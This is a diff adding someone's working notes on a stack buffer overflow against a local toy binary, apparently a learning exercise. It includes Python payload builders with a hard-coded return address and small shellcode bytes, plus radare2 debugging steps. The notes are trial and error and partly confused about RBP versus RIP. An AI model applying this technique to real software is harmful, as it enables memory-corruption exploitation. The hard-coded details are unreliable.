@@ -1,0 +1,58 @@
+the program will copy the buffer from the cli arg to the stack
+this will overwrite RBP
+the function will get to the return call
+it will jump to the new return value given by RBP
+
+we want it to jump to the start of the buffer
+the buffer is at rbp-0x4
+rbp = 0x 7f ff ff ff e4 12
+rbp - 0x4 = 
+    = 0x 7f ff ff ff e4 0e
+
+prepared the input with this 
+
+exploit = b'\x7f\xff\xff\xff\xe4\x0e'
+exploit = b'\x0e\xe4\xff\xff\xff\x7f'
+offset = 4
+payload = b'0'*offset + exploit
+f = open('program_input', 'wb')
+f.write(payload)
+mean to jump to       0x 7f ff ff ff e4 0e
+but we are jumping to 0x 7f ff f7 c2 35 10
+
+we have overwritten RBP but not RIP
+this is the normal return location
+
+revised:
+exploit = b'\x10\xe4\xff\xff\xff\x7f'
+program = b'\x00\x01\x02\x03\x04'
+offset = 8
+payload = program + b'0'*offset + exploit
+f = open('program_input', 'wb')
+f.write(payload)
+
+this one jumps to e410
+e40e had a weird instruction there and was not the buffer start
+
+reivsed:
+exploit = b'\x11\xe4\xff\xff\xff\x7f'
+program = b'\x00\x01\x02\x03\x04'
+# add rax, 8
+program = b'\x48\x83\xc0\x08\x00' + b'\x48\x83\xc0\x08\x00'
+offset = 4
+payload = program + b'0'*offset + exploit
+f = open('program_input', 'wb')
+f.write(payload)
+
+okay for this we can trigger it with 
+r2 -i c_exploit.r2 -d hello "$(cat program_input)"
+-> 
+aaa
+afl
+dcu main
+dcu 0x00401195
+dr rbp
+#dso 1
+
+and then do VV, step 1 and define function 
+and we have 2 instructions we prepared able to step through them
